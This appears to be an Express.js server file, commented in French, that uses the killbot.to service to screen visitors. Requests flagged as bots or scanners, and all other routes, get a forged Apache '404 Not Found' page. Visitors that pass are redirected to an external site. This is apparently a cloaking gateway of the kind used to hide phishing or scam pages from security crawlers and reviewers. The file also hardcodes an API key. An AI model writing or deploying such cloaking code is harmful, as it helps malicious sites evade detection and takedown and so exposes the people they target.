// index.js

const express = require('express');
const KillBot = require('killbot.to'); // On utilise le module installé dans node_modules

const app = express();
const PORT = process.env.PORT || 3000;

// Votre API key killbot.to
const apiKey = '225e7b97-524c-45d6-800c-aa7e3831a1ab';
const config = 'default';

// On crée l'instance
const killBot = new KillBot(apiKey, config);

// Faux 404 HTML
const fake404 = `
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
        <html><head>
        <title>404 Not Found</title>
        </head><body>
        <h1>Not Found</h1>
        <p>The requested URL $requestedPageWithoutQueryString was not found on this server.</p>
        <hr>
        <address>Apache/2.4.57 (Debian) Server at $serverName Port 80</address>
        </body></html>
`;

// Route principale
app.get('/', async (req, res) => {
  try {
    // On vérifie la requête
    const result = await killBot.checkReq(req);

    // Si bloqué => faux 404
    if (result.block) {
      return res.status(404).send(fake404);
    } else {
      // Sinon => redirection (ou contenu)
      return res.redirect('https://maurpie.com');
    }
  } catch (error) {
    // Si KillBot renvoie "Invalid IP" ou autre
    console.error('KillBot error:', error.message);
    return res.status(404).send(fake404);
  }
});

// Toute autre route => 404 ou pas ?
app.all('*', (req, res) => {
  res.status(404).send(fake404);
});

// Lancement
app.listen(PORT, () => {
  console.log(`Server is listening on port ${PORT}`);
});